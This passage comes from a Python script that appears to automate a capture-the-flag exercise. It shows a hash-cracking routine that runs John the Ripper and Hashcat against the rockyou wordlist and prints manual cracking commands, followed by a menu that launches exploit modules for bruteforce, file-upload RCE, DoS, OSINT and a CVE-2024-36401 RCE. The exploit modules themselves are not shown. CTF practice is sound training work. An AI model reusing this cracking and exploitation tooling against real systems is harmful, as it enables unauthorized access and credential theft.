            if test_hash == password_hash:
                print_success(f"PASSWORD FOUND: {pwd}")
                return pwd

        print_warning("Not found in repository wordlist")
        
        # Phase 2: Try with John if available
        print_info("\n[Phase 2] Trying with John The Ripper...")
        
        if run_command("which john", timeout=5):
            hash_file = "/tmp/hash_to_crack.txt"
            with open(hash_file, 'w') as f:
                f.write(password_hash)
            
            john_cmd = f"john --format=raw-{hash_type} --wordlist=/usr/share/wordlists/rockyou.txt {hash_file} --max-run-time=60"
            print_info(f"Command: {john_cmd}")
            
            result = run_command(john_cmd, timeout=70)
            
            # Get result
            show_cmd = f"john --show --format=raw-{hash_type} {hash_file}"
            show_result = run_command(show_cmd, timeout=5)
            
            if show_result and ":" in show_result:
                password = show_result.split(':')[-1].strip()
                if password and password != "0 password hashes cracked":
                    print_success(f"John found: {password}")
                    return password
        
        # Phase 3: Hashcat if available
        print_info("\n[Phase 3] Trying with Hashcat...")
        
        if run_command("which hashcat", timeout=5):
            hash_file = "/tmp/hash_to_crack.txt"
            with open(hash_file, 'w') as f:
                f.write(password_hash)
            
            hashcat_cmd = f"hashcat -m {hashcat_mode} -a 0 {hash_file} /usr/share/wordlists/rockyou.txt --runtime=60"
            print_info(f"Command: {hashcat_cmd}")
            
            result = run_command(hashcat_cmd, timeout=70)
            
            if result and ":" in result:
                for line in result.split('\n'):
                    if password_hash in line and ":" in line:
                        password = line.split(':')[-1].strip()
                        print_success(f"Hashcat found: {password}")
                        return password
        
        # Failed: ask manually
        print_warning("\nAutomatic crack failed. Try manually:")
        print(f"  {Colors.CYAN}echo '{password_hash}' > hash.txt{Colors.ENDC}")
        print(f"  {Colors.CYAN}hashcat -m {hashcat_mode} -a 0 hash.txt rockyou.txt{Colors.ENDC}")
        print(f"  {Colors.CYAN}john --format=raw-{hash_type} --wordlist=rockyou.txt hash.txt{Colors.ENDC}")
        print()
        
        password = input(f"{Colors.YELLOW}Password cracked manually: {Colors.ENDC}")
        return password if password else None


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MENU PRINCIPAL
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def main_menu():
    """Main menu"""
    
    captured_flags = {}
    
    while True:
        clear_screen()
        banner()
        
        print(f"\n{Colors.BOLD}  MENU PRINCIPAL{Colors.ENDC}\n")
        
        print("  [0] Complete Reconnaissance (DNS, Ports, Services)")
        print()
        
        exploits = {
            1: ("FileServer - Bruteforce + ZIP Cracking", Exploit1_FileServer),
            2: ("Travel - File Upload RCE", Exploit2_Travel),
            3: ("Restricted - DoS + Info Disclosure", Exploit3_Restricted),
            4: ("Staging (Liberty) - OSINT", Exploit4_Staging),
            5: ("WebServices - CVE-2024-36401 RCE", Exploit5_WebServices),
        }
        
        for num, (name, _) in exploits.items():
            status = f"{Colors.GREEN}âœ“{Colors.ENDC}" if num in captured_flags else " "
            print(f"  [{status}] [{num}] {name}")
            if num in captured_flags:
                print(f"        â†’ {Colors.YELLOW}{captured_flags[num]}{Colors.ENDC}")
        
        print()
        print(f"  [6] Display all flags")
        print(f"  [9] Exit")
        print()
        
        try:
            choice = input(f"  {Colors.CYAN}Choice: {Colors.ENDC}")
            choice = int(choice)
            
            if choice == 9:
                print_info("\nGoodbye!")
                break
            elif choice == 0:
                recon = Reconnaissance()
                recon.run_full_recon()
                pause()
            elif choice in exploits:
                exploit_class = exploits[choice][1]
                exploit = exploit_class()
                flag = exploit.run()
                if flag:
                    captured_flags[choice] = flag
            elif choice == 6:
                clear_screen()
                print_section("FLAGS CAPTURÃ‰S")
                if captured_flags:
                    for num, flag in sorted(captured_flags.items()):
                        print(f"  [{num}] {Colors.GREEN}{flag}{Colors.ENDC}")
                else:
                    print_warning("No flags captured")
                pause()
                
        except ValueError:
            pass
        except KeyboardInterrupt:
            print_info("\n\nInterruption.")
            break


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# POINT D'ENTRÃ‰E
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print_info("\n\nInterruption.")
        sys.exit(0)
